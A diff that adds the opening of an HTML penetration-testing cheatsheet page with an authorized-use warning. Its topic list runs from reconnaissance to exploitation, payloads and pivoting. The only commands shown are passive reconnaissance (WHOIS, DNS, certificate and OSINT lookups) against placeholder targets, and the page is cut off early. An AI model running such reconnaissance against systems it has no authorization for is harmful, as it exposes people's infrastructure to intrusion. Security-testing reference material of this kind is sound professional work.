@@ -1,4 +1,1247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HackersCheatsheet 🛡️</title>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #0A0A0A;
+            --surface-color: rgba(20, 20, 20, 0.7);
+            --border-color: rgba(0, 255, 65, 0.2);
+            --text-main: #E0E0E0;
+            --text-muted: #888888;
+            --accent-green: #00FF41;
+            --accent-glow: rgba(0, 255, 65, 0.5);
+            --danger-red: #FF3333;
+            --code-bg: #111111;
+        }
 
-<!doctype html><html lang="en" data-frame-uuid="0fddddc9-40a5-4a85-986f-5dfc31cb5036"><head><meta property="og:title" content="Claude Artifact"><meta name="twitter:title" content="Claude Artifact"><meta name="description" content="Try out Artifacts created by Claude users"><meta property="og:description" content="Try out Artifacts created by Claude users"><meta name="twitter:description" content="Try out Artifacts created by Claude users"><meta property="og:image" content="https://claude.ai/images/claude_ogimage.png"><meta name="twitter:image" content="https://claude.ai/images/claude_ogimage.png"><meta property="og:image:width" content="1138"><meta property="og:image:height" content="640"><meta property="og:image:alt" content="Claude Artifact"><meta name="twitter:card" content="summary"><meta name="robots" content="noindex, nofollow"><link rel="preconnect" href="https://assets-proxy.anthropic.com" crossorigin><link rel="dns-prefetch" href="https://assets-proxy.anthropic.com"><meta name="build-timestamp" content="1789524234"><meta name="build-git-hash" content="ece71a094a70b474825c240a31dbb5994574611e"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="robots" content="noindex"><meta name="referrer" content="no-referrer"><title>Claude Artifact</title><script nonce="wFWHSpHy0IlqtPe3anrX8A==">window.__frameInlineProbe=new Error,function(e,t,o){try{var n=window===top&&history.state,r=n&&n.__tempLocation;if(r&&void 0===n.__tempKey&&"string"==typeof r.href){var a=new URL(r.href,location.origin);a.origin===location.origin&&(location.replace(a.href),e.leaving="")}}catch{}if(t?.embedded&&(e.embedded=e.host=""),parent!==window){var i=location.origin,c=location.ancestorOrigins;if(c)c[0]===i&&c[c.length-1]===i&&(e.embedded="");else if(parent===top&&document.referrer)try{new URL(document.referrer).origin===i&&(e.embedded="")}catch{}try{var d=window.frameElement;d&&d.ownerDocument.documentElement.hasAttribute("data-frame-uuid")&&(e.nested="")}catch{}}"embedded"in e&&"none"===(t?.chrome??o.get("chrome"))&&(e.chrome="none",document.querySelector("meta[name=viewport]").setAttribute("content","width=device-width,initial-scale=1,viewport-fit=cover"));var s="desktop"===t?.platform?"host-tools":"comment-mode",m="embedded"in e?t?null!=t.hostcaps?t.hostcaps:(" "+o.get("hostcaps")+" ").indexOf(" "+s+" ")<0?"":s:o.get("hostcaps"):"",l=String(m||"").split(" ").filter(function(e,t,o){return("comment-mode"===e||"comments-list"===e||"page-comments"===e||"artifact-nav"===e||"comment-summon"===e||"open-in-claude"===e||"open-chat"===e||"cloud-session"===e||"cowork-task"===e||"no-send-all"===e||"confirm-page-sends"===e||"viewer-context"===e||"chrome"===e||"export"===e||"chrome-readonly"===e||"selection-menu"===e||"chat-beside"===e||"header"===e||"duplicate"===e||"sheet-arrow"===e||"presence"===e||"host-tools"===e||"context-card"===e||"context-send"===e||"host-nav"===e||"url-anchor"===e||"edge-to-edge"===e||"save-file"===e||"host-keys"===e)&&o.indexOf(e)===t});l.length&&(e.hostcaps=l.join(" "));var h={mode:["light","dark","system"],platform:["web","desktop"],font:["anthropic","system"]};for(var p of Object.keys(h)){var f=t?.[p]??o.get(p[0]);if("mode"===p&&null==t?.mode&&!("embedded"in e))try{var u=JSON.parse(localStorage.getItem("LSS-userThemeMode"));u&&"object"==typeof u&&(u=u.value),"light"!==u&&"dark"!==u||(f=u)}catch(e){}h[p].includes(f)&&(e[p]=f)}}(document.documentElement.dataset,window.claudeDesktopArtifactPane,new URLSearchParams(location.search))</script><script nonce="wFWHSpHy0IlqtPe3anrX8A==">!function(){try{var e=document.documentElement.dataset,t=e.frameUuid;if(!t||"leaving"in e||"nested"in e)return;var r=/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/,a=new URLSearchParams(location.search),n=self===top&&!("embedded"in document.documentElement.dataset),o=a.get("org"),s=(document.cookie.match(/(?:^|;\s*)lastActiveOrg=([^;]*)/)||[])[1],i=null,c=performance.getEntriesByType&&performance.getEntriesByType("navigation")[0]||{};if(n&&("reload"===c.type||"back_forward"===c.type))try{i=sessionStorage.getItem("frame_boot_org:"+t)}catch(e){}var m=o&&r.test(o)?o:i&&r.test(i)?i:s&&r.test(s)?s:null,d=a.get("via"),l=null!==d?d:n?"user_open":"embedded_view",u=a.get("sk"),f=new URLSearchParams;m&&f.set("org",m),l&&f.set("via",l),u&&/^[A-Za-z0-9_-]{16,64}$/.test(u)&&f.set("sk",u);var g=location.pathname.split("/").pop()||"";try{g=decodeURIComponent(g)}catch(e){}var h="";g.toLowerCase().slice(-37)==="-"+t.toLowerCase()?h=g.slice(0,g.length-37):g.length>23&&"-"===g.charAt(g.length-23)&&/^[1-9A-HJ-NP-Za-km-z]{22}$/.test(g.slice(-22))&&(h=g.slice(0,g.length-23)),/^[a-z0-9][a-z0-9-]{0,59}$/.test(h)&&f.set("vanity",h);var _=window.__frameSessionId;null==_&&(_=window.__frameSessionId=crypto.randomUUID?crypto.randomUUID():"");var p="initial";try{var v=function(e){try{var t=sessionStorage.getItem(e);if(!_||!t)return!1;var r=e+"_claim",a=_+"|"+t,n=sessionStorage.getItem(r);if(n===a)return!0;var o=n?n.split("|"):[],s=Number(o[2]);return!(3!==o.length||"reload"!==o[0]||o[1]!==t||!Number.isFinite(s)||Date.now()-s>=3e4)&&(sessionStorage.setItem(r,a),sessionStorage.getItem(r)===a)}catch(e){return!1}},w=(sessionStorage.getItem("frame_chunk_reload")||"").split(":"),b=Number(w[2]),y=w[0]===t&&("chrome"===w[1]||"deferred"===w[1]||"broker"===w[1])&&Number.isFinite(b)&&Date.now()-b<3e5,S="frame_hot_hard_reload:"+t,I=(sessionStorage.getItem(S)||"").split(":"),k=Number(I[2]),P=I[0]===t&&Number.isFinite(k)&&Date.now()-k<3e5,F=function(e){var r=sessionStorage.getItem(e);if(!r)return!1;var a=r.lastIndexOf(":"),n=Number(r.slice(a+1));return r.slice(0,a)===t&&Number.isFinite(n)&&Date.now()-n<3e5}("frame_pin_reload")&&v("frame_pin_reload"),A=y&&v("frame_chunk_reload"),N=P&&v(S);(F||A||N)&&(p="reboot")}catch(e){}f.set("bk",p);var U="/api/frame/"+t+"?"+f.toString(),C=function(e,t){var r=null==e?null:e.toLowerCase();return null!==r&&-1!==t.indexOf(r)?r:null},D=navigator.userAgent,E={"X-Frame-CP":"go","X-Frame-Platform":C(a.get("platform"),["web","desktop","ios","android","cli"])||(D.includes(" Electron/")?"desktop":/Android/.test(D)?"android":/iPad|iPhone|iPod/.test(D)||D.includes("Macintosh")&&navigator.maxTouchPoints>1?"ios":"web")},X=C(a.get("surface"),["chat","cowork","code","slack","teams","standalone"])||(n?"standalone":"");X&&(E["X-Frame-Surface"]=X);var x=document.head.querySelector('meta[name="build-timestamp"]');x&&x.content&&(E["X-Frame-Client-Version"]=x.content),_&&(E["X-Frame-Session-Id"]=_);var B=function(){return fetch(U,{credentials:"same-origin",headers:E,priority:"high",signal:AbortSignal.timeout(2e4)})};if(parent!==window&&"embedded"in document.documentElement.dataset){var L=null;try{var T=parent.__frameHostBoot;(L=T&&T[U]||null)&&delete T[U]}catch(e){L=null}if(L&&L.res&&"function"==typeof L.res.then){L.sid&&(E["X-Frame-Session-Id"]=window.__frameSessionId=L.sid),"number"==typeof L.at&&"string"==typeof L.from&&(window.__frameHostStart={at:L.at,from:L.from});var z=L.res.then(function(e){try{var t=204===e.status||205===e.status||304===e.status;return new Response(t?null:e.body,{status:e.status,statusText:e.statusText,headers:e.headers})}catch(e){return B()}});return z.catch(function(){}),void(window.__frameBootPrefetch={url:U,res:z})}}var R=B();if(R.catch(function(){}),window.__frameBootPrefetch={url:U,res:R},!m){var $=fetch("/api/account",{credentials:"same-origin",signal:AbortSignal.timeout(8e3)});$.catch(function(){}),window.__frameAccountPrefetch={res:$}}}catch(e){}}()</script><link rel="preload" as="font" type="font/woff2" crossorigin href="https://assets-proxy.anthropic.com/claude-ai/v2/assets/v1/cc27851ad-DDVos-BJ.woff2"><link rel="preload" as="font" type="font/woff2" crossorigin href="https://assets-proxy.anthropic.com/claude-ai/v2/assets/v1/c0f671921-Dhotchgo.woff2"><script type="module" crossorigin src="https://assets-proxy.anthropic.com/claude-ai/v2/assets/v1/frame-shell-ouozvEZc.js" nonce="wFWHSpHy0IlqtPe3anrX8A=="></script><link rel="modulepreload" crossorigin href="https://assets-proxy.anthropic.com/claude-ai/v2/assets/v1/preload-helper-DtW4zpUn.js"><link rel="modulepreload" crossorigin href="https://assets-proxy.anthropic.com/claude-ai/v2/assets/v1/shared-frame-boot-MTe7RjtW.js"><link rel="modulepreload" crossorigin href="https://assets-proxy.anthropic.com/claude-ai/v2/assets/v1/frame-shell-chrome-CUJxjg4_.js"><link rel="modulepreload" crossorigin href="https://assets-proxy.anthropic.com/claude-ai/v2/assets/v1/vendor-frame-D5M5RdTa.js"><link rel="modulepreload" crossorigin href="https://assets-proxy.anthropic.com/claude-ai/v2/assets/v1/rolldown-runtime-C7IGMTkM.js"><link rel="modulepreload" crossorigin href="https://assets-proxy.anthropic.com/claude-ai/v2/assets/v1/shared-frame-B_uzkTHg.js"><link rel="modulepreload" crossorigin href="https://assets-proxy.anthropic.com/claude-ai/v2/assets/v1/frame-shell-deferred-CmcKiS6Y.js"><link rel="modulepreload" crossorigin href="https://assets-proxy.anthropic.com/claude-ai/v2/assets/v1/frame-shell-broker-CeD-kVgK.js" fetchpriority="low"><style nonce="wFWHSpHy0IlqtPe3anrX8A==">:root{--font-anthropic-sans:"anthropic-sans", ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif}@font-face{font-family:anthropic-sans;src:url(https://assets-proxy.anthropic.com/claude-ai/v2/assets/v1/cc27851ad-DDVos-BJ.woff2)format("woff2");font-weight:300 800;font-style:normal;font-display:swap;font-feature-settings:"dlig" 0}@font-face{font-family:anthropic-sans;src:url(https://assets-proxy.anthropic.com/claude-ai/v2/assets/v1/c9d3a3a49-CJtkx3-S.woff2)format("woff2");font-weight:300 800;font-style:italic;font-display:swap;font-feature-settings:"dlig" 0}:root{--font-anthropic-serif:"anthropic-serif", ui-serif, Georgia, "Times New Roman", serif}@font-face{font-family:anthropic-serif;src:url(https://assets-proxy.anthropic.com/claude-ai/v2/assets/v1/c66fc489e-2VcCjn5t.woff2)format("woff2");font-weight:300 800;font-style:normal;font-display:swap;font-feature-settings:"dlig" 0}@font-face{font-family:anthropic-serif;src:url(https://assets-proxy.anthropic.com/claude-ai/v2/assets/v1/cc410af59-Dcb-9NUS.woff2)format("woff2");font-weight:300 800;font-style:italic;font-display:swap;font-feature-settings:"dlig" 0}:root{--bg:#fff;--fg:#0b0b0b;--mut:#52514e;--spin:#898781;--line:#0b0b0b1a;--div:#0b0b0b0d;--bord:#0b0b0b33;--hov:#0b0b0b0d;--surf:#fff;--brand:#c6613f;--primary:#0b0b0b;--on-primary:#fff}@media (prefers-color-scheme:dark){html:not([data-mode]){--bg:#1a1a19;--fg:#f0efec;--mut:#c3c2b7;--line:#ffffff1a;--div:#ffffff0d;--bord:#fff3;--hov:#ffffff13;--surf:#20201f;--primary:#fff;--on-primary:#0b0b0b}}html[data-mode=light]{--lightningcss-light:initial;--lightningcss-dark: ;color-scheme:light}html[data-mode=dark]{--bg:#1a1a19;--fg:#f0efec;--mut:#c3c2b7;--line:#ffffff1a;--div:#ffffff0d;--bord:#fff3;--hov:#ffffff13;--surf:#20201f;--primary:#fff;--on-primary:#0b0b0b;--lightningcss-light: ;--lightningcss-dark:initial;color-scheme:dark}@font-face{font-family:Anthropicons-Variable;src:url(https://assets-proxy.anthropic.com/claude-ai/v2/assets/v1/c0f671921-Dhotchgo.woff2)format("woff2-variations");font-weight:400 700;font-display:block}@property --bar{syntax:"<length>";inherits:true;initial-value:0}:root{--bar-h:calc(2.5rem * var(--cds-rem-scale,1));--bar:var(--bar-h);--lightningcss-light:initial;--lightningcss-dark: ;color-scheme:light dark}@media (prefers-color-scheme:dark){:root{--lightningcss-light: ;--lightningcss-dark:initial}}@layer{*{box-sizing:border-box;margin:0;padding:0}button{font:inherit;border:0;background:0 0;cursor:pointer;color:inherit}}html,body{overscroll-behavior:none;background:var(--bg);height:100%;color:var(--fg);overflow:hidden}body{font:13px/1.4 anthropic-sans,-apple-system,BlinkMacSystemFont,system-ui,sans-serif}#hdr{height:var(--bar-h);justify-content:space-between;align-items:center;gap:8px;padding:0 12px;display:flex;position:relative}html:not([data-embedded]) #hdr,html:not([data-embedded]) #hdr-degraded{border-bottom:1px solid var(--div)}.l,.r{align-items:center;gap:8px;display:flex}.l{flex:1;min-width:0}.r{flex:none}.byline{font-size:var(--cds-font-size-caption,.75rem);color:var(--mut);white-space:nowrap;text-overflow:ellipsis;flex-shrink:0;max-width:312px;overflow:hidden}.l>button[data-title-menu]{flex-shrink:1000;min-width:0;margin-left:-6px;overflow:hidden}.l button[data-title-menu]>span,.l button[data-title-menu] .truncate{min-width:0}.skel{background:var(--hov);border-radius:4px;display:inline-block}.skel-home{flex:none;width:16px;height:16px;margin-right:4px}.skel-title{width:8em;height:1em}.skel-avatar{border-radius:50%;width:24px;height:24px}.degraded-title{white-space:nowrap;text-overflow:ellipsis;font-size:13px;font-weight:400;overflow:hidden}#hdr-degraded,body.chrome-degraded #hdr{display:none}body.chrome-degraded #hdr-degraded{height:var(--bar-h);align-items:center;gap:8px;padding:0 12px;display:flex}@media (width<=768px){html:not([data-embedded]) .l{grid-template-columns:minmax(0,1fr);place-items:center start;gap:0;display:grid}html:not([data-embedded]) .l>*{max-width:100%}html:not([data-embedded]) .l>.byline{margin-top:-3px}html:not([data-embedded]) .l>[data-storage]{margin-top:-4px}}html[data-embedded]{--bar-h:calc(2.625rem * var(--cds-rem-scale,1))}html[data-embedded] #hdr{padding:0 8px}html[data-embedded] .byline{flex-shrink:1;max-width:100%}html[data-embedded] .skel-home,html[data-embedded] .skel-title,html[data-embedded] .skel-avatar,html[data-embedded][data-chrome=none] #hdr,html[data-embedded][data-chrome=none] #hdr-degraded,html[data-header-hidden] #hdr,html[data-header-hidden] #hdr-degraded,html[data-header-hidden] [data-chrome-pill]{display:none}html[data-embedded][data-chrome=none],html[data-header-hidden]{--bar:0px}html[data-host][data-chrome=none]{--bar:env(safe-area-inset-top,0px)}main{inset:var(--bar) 0 0 0;display:flex;position:absolute}html[data-host][data-chrome=none][data-extended-edges~=top] main{top:0}html[data-host][data-chrome=none][data-extended-edges~=top] #loading{top:var(--bar)}#frame-slot{flex:1;min-width:0;position:relative}#loading{justify-content:center;align-items:center;display:flex;position:absolute;inset:0}#loading[hidden]{display:none}#loading.slow{text-align:center;color:var(--mut);flex-direction:column;gap:12px;padding:0 24px;font-size:13px}#loading.slow>button{order:1}#loading:after{content:"";box-sizing:border-box;background:conic-gradient(transparent 40%, var(--spin)) border-box, linear-gradient(var(--line), var(--line)) border-box;border:2px solid #0000;border-radius:50%;width:20px;height:20px;animation:1s linear infinite spin;mask:radial-gradient(farthest-side,#0000 calc(100% - 2px),#000 calc(100% - 1.5px))}@keyframes spin{to{transform:rotate(360deg)}}#frame-content{opacity:0;border:0;width:100%;height:100%;transition:opacity .12s;position:absolute;inset:0}#frame-slot>iframe.swap:not(.ready){opacity:0;pointer-events:none;border:0;width:100%;height:100%;position:absolute;inset:0}#frame-slot>iframe.swap.hot-under:not(.ready){opacity:1}#frame-slot>iframe.hot-under~#frame-content{background:var(--bg)}#frame-slot>iframe.retired{opacity:0;pointer-events:none;border:0;width:100%;height:100%;position:absolute;inset:0}#frame-content.swap{transition:none}#frame-content.swap.crossfade{transition:opacity .12s}#frame-slot>iframe.fading-out{opacity:1;pointer-events:none;border:0;width:100%;height:100%;position:absolute;inset:0}#frame-content.ready{opacity:1}@media (prefers-reduced-motion:reduce){#loading:after{animation:none}#frame-content{transition:none}}body.err #hdr,body.err #hdr-degraded,#err[hidden]{display:none}#err{text-align:center;color:var(--fg);place-content:safe center;gap:8px;padding:96px 16px 128px;display:grid;position:absolute;inset:0;overflow-y:auto}
-@font-face{font-family:Anthropicons-Variable;src:url(https://assets-proxy.anthropic.com/claude-ai/v2/assets/v1/c0f671921-Dhotchgo.woff2)format("woff2-variations");font-weight:400 700;font-display:block}
-</style><meta name="shell-inline-span" content="6135"><meta name="robots" content="noindex, nofollow"><link rel="preconnect" href="https://0fddddc9-40a5-4a85-986f-5dfc31cb5036.frame.claudeusercontent.com"></head><body><header id="hdr" tabindex="-1" aria-label="Artifact controls"><span class="skel skel-home" aria-hidden="true"></span><div class="l" aria-hidden="true"><span class="skel skel-title"></span></div><div class="r" aria-hidden="true"><span class="skel skel-avatar"></span></div></header><div id="hdr-degraded"><span class="degraded-title"></span> <span class="byline">Content is user-generated and unverified.</span></div><main><div id="frame-slot" data-frame-uuid="0fddddc9-40a5-4a85-986f-5dfc31cb5036" data-frame-uchost="0fddddc9-40a5-4a85-986f-5dfc31cb5036.frame.claudeusercontent.com" data-frame-tophost="0fddddc9-40a5-4a85-986f-5dfc31cb5036-top.frame.claudeusercontent.com"><div id="loading"><div class="loading-status" role="status" aria-label="Loading" tabindex="-1"></div></div></div></main><div id="err" hidden></div></body></html>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
+            line-height: 1.6;
+            background-image: 
+                linear-gradient(rgba(0, 255, 65, 0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 65, 0.03) 1px, transparent 1px);
+            background-size: 30px 30px;
+            background-position: center top;
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: var(--bg-color); }
+        ::-webkit-scrollbar-thumb { background: var(--accent-green); border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #00cc33; }
+
+        header {
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            background: rgba(10, 10, 10, 0.85);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--border-color);
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--text-main);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo span {
+            color: var(--accent-green);
+            text-shadow: 0 0 10px var(--accent-glow);
+        }
+
+        .search-container {
+            position: relative;
+            width: 300px;
+        }
+
+        .search-container input {
+            width: 100%;
+            padding: 0.75rem 1rem 0.75rem 2.5rem;
+            background: var(--code-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--accent-green);
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9rem;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        .search-container input:focus {
+            box-shadow: 0 0 15px var(--accent-glow);
+            border-color: var(--accent-green);
+        }
+
+        .search-icon {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--accent-green);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+            display: grid;
+            grid-template-columns: 250px 1fr;
+            gap: 2rem;
+        }
+
+        .sidebar {
+            position: sticky;
+            top: 100px;
+            height: calc(100vh - 120px);
+            overflow-y: auto;
+            padding-right: 1rem;
+        }
+
+        .sidebar h3 {
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--text-muted);
+            margin-bottom: 1rem;
+        }
+
+        .nav-list {
+            list-style: none;
+        }
+
+        .nav-item {
+            margin-bottom: 0.5rem;
+        }
+
+        .nav-link {
+            color: var(--text-main);
+            text-decoration: none;
+            font-size: 0.95rem;
+            display: block;
+            padding: 0.5rem;
+            border-radius: 6px;
+            transition: all 0.2s ease;
+            border-left: 2px solid transparent;
+        }
+
+        .nav-link:hover, .nav-link.active {
+            background: rgba(0, 255, 65, 0.1);
+            color: var(--accent-green);
+            border-left: 2px solid var(--accent-green);
+        }
+
+        .main-content {
+            min-width: 0;
+        }
+
+        .warning-banner {
+            background: rgba(255, 51, 51, 0.1);
+            border: 1px solid var(--danger-red);
+            border-left: 4px solid var(--danger-red);
+            padding: 1rem;
+            border-radius: 6px;
+            margin-bottom: 2rem;
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+        }
+        
+        .warning-banner h4 {
+            color: var(--danger-red);
+            margin-bottom: 0.5rem;
+        }
+
+        .section-card {
+            background: var(--surface-color);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .section-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(0, 255, 65, 0.1);
+        }
+
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            margin-bottom: 1rem;
+        }
+
+        .section-title {
+            font-size: 1.25rem;
+            font-weight: 600;
+            color: var(--accent-green);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .section-desc {
+            color: var(--text-muted);
+            margin-bottom: 1.5rem;
+            font-size: 0.95rem;
+        }
+
+        .code-container {
+            position: relative;
+            margin-bottom: 1rem;
+        }
+
+        pre {
+            background: var(--code-bg);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            padding: 1rem;
+            overflow-x: auto;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+            color: #A6ACCD;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        /* Simple Syntax Highlighting via CSS */
+        .comment { color: #676E95; font-style: italic; }
+        .command { color: #82AAFF; }
+        .arg { color: #C3E88D; }
+
+        .copy-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: var(--text-main);
+            padding: 0.4rem 0.8rem;
+            border-radius: 6px;
+            font-size: 0.75rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            opacity: 0;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .code-container:hover .copy-btn {
+            opacity: 1;
+        }
+
+        .copy-btn:hover {
+            background: var(--accent-green);
+            color: #000;
+            border-color: var(--accent-green);
+        }
+
+        .collapse-icon {
+            color: var(--accent-green);
+            transition: transform 0.3s ease;
+        }
+        
+        .section-card.collapsed .collapse-icon {
+            transform: rotate(-90deg);
+        }
+
+        .section-card.collapsed .section-content {
+            display: none;
+        }
+
+        @media (max-width: 900px) {
+            .container {
+                grid-template-columns: 1fr;
+            }
+            .sidebar {
+                display: none;
+            }
+        }
+        
+        @media (max-width: 600px) {
+            header {
+                flex-direction: column;
+                gap: 1rem;
+            }
+            .search-container {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="logo">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+            </svg>
+            Hackers<span>Cheatsheet</span>
+        </div>
+        <div class="search-container">
+            <svg class="search-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="11" cy="11" r="8"></circle>
+                <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+            </svg>
+            <input type="text" id="searchInput" placeholder="Search commands, tools...">
+        </div>
+    </header>
+
+    <div class="container">
+        <aside class="sidebar">
+            <h3>Topics</h3>
+            <ul class="nav-list" id="navList">
+                
+                <li class="nav-item">
+                    <a href="#section-1" class="nav-link">1. Recon & OSINT</a>
+                </li>
+
+                <li class="nav-item">
+                    <a href="#section-2" class="nav-link">2. Recon: Search Engine Dorking & Exposed Assets</a>
+                </li>
+
+                <li class="nav-item">
+                    <a href="#section-3" class="nav-link">3. SEO & Indexation Security</a>
+                </li>
+
+                <li class="nav-item">
+                    <a href="#section-4" class="nav-link">4. Subdomain & DNS Enumeration</a>
+                </li>
+
+                <li class="nav-item">
+                    <a href="#section-5" class="nav-link">5. Port & Service Discovery</a>
+                </li>
+
+                <li class="nav-item">
+                    <a href="#section-6" class="nav-link">6. Web Discovery & Fuzzing</a>
+                </li>
+
+                <li class="nav-item">
+                    <a href="#section-7" class="nav-link">7. Web Application Testing</a>
+                </li>
+
+                <li class="nav-item">
+                    <a href="#section-8" class="nav-link">8. Vulnerability Scanning & SCA</a>
+                </li>
+
+                <li class="nav-item">
+                    <a href="#section-9" class="nav-link">9. Passwords, Credentials & AD Tooling</a>
+                </li>
+
+                <li class="nav-item">
+                    <a href="#section-10" class="nav-link">10. Exploitation: Metasploit Framework (MSF)</a>
+                </li>
+
+                <li class="nav-item">
+                    <a href="#section-11" class="nav-link">11. Post-Exploitation: Shells & Enumeration</a>
+                </li>
+
+                <li class="nav-item">
+                    <a href="#section-12" class="nav-link">12. Network & TLS Checks</a>
+                </li>
+
+                <li class="nav-item">
+                    <a href="#section-13" class="nav-link">13. Vulnerability Research & PoC Triage</a>
+                </li>
+
+                <li class="nav-item">
+                    <a href="#section-14" class="nav-link">14. Binary Reversing & Exploit Development</a>
+                </li>
+
+                <li class="nav-item">
+                    <a href="#section-15" class="nav-link">15. Fuzzing</a>
+                </li>
+
+                <li class="nav-item">
+                    <a href="#section-16" class="nav-link">16. Mobile & Firmware Analysis</a>
+                </li>
+
+                <li class="nav-item">
+                    <a href="#section-17" class="nav-link">17. Safe PoC Testing & Logging</a>
+                </li>
+
+                <li class="nav-item">
+                    <a href="#section-18" class="nav-link">18. Evasion & msfvenom Payloads</a>
+                </li>
+
+                <li class="nav-item">
+                    <a href="#section-19" class="nav-link">19. File Transfer (In-Memory & On-Disk)</a>
+                </li>
+
+                <li class="nav-item">
+                    <a href="#section-20" class="nav-link">20. Tunneling & Pivoting</a>
+                </li>
+
+            </ul>
+        </aside>
+
+        <main class="main-content" id="mainContent">
+            <div class="warning-banner">
+                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0;">
+                    <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
+                    <line x1="12" y1="9" x2="12" y2="13"></line>
+                    <line x1="12" y1="17" x2="12.01" y2="17"></line>
+                </svg>
+                <div>
+                    <h4>AUTHORIZED USE ONLY</h4>
+                    <p>Do not run these commands against systems you do not own or for which you do not have explicit written authorization from the asset owner. Misuse is illegal and unethical.</p>
+                </div>
+            </div>
+
+            <!-- Sections generated here -->
+            
+            <div class="section-card" id="section-1">
+                <div class="section-header">
+                    <h2 class="section-title">
+                        <span style="color: var(--text-muted); margin-right: 8px;">1.</span> Recon & OSINT
+                    </h2>
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="6 9 12 15 18 9"></polyline>
+                    </svg>
+                </div>
+                <div class="section-content">
+                    <p class="section-desc">Footprinting, WHOIS, DNS lookups, and passive certificate data gathering.</p>
+                    <div class="code-container">
+                        <button class="copy-btn">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                            </svg>
+                            Copy
+                        </button>
+                        <pre><code class="language-bash"># Set target
+TARGET=example.com
+
+# WHOIS lookup
+whois $TARGET
+
+# DNS: A + MX + NS records
+dig +noall +answer $TARGET A
+dig +noall +answer $TARGET MX
+dig +noall +answer $TARGET NS
+
+# HTTP headers check
+curl -I -L --max-redirs 5 https://$TARGET
+
+# Certificate names (crt.sh)
+curl -s "https://crt.sh/?q=%25.$TARGET&amp;output=json" | jq -r '.[].name_value' | sort -u
+
+# Passive OSINT (AUTHORIZED USE ONLY)
+theharvester -d example.com -b google,bing,linkedin -l 500
+shodan host 1.2.3.4
+</code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-card" id="section-2">
+                <div class="section-header">
+                    <h2 class="section-title">
+                        <span style="color: var(--text-muted); margin-right: 8px;">2.</span> Recon: Search Engine Dorking & Exposed Assets
+                    </h2>
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="6 9 12 15 18 9"></polyline>
+                    </svg>
+                </div>
+                <div class="section-content">
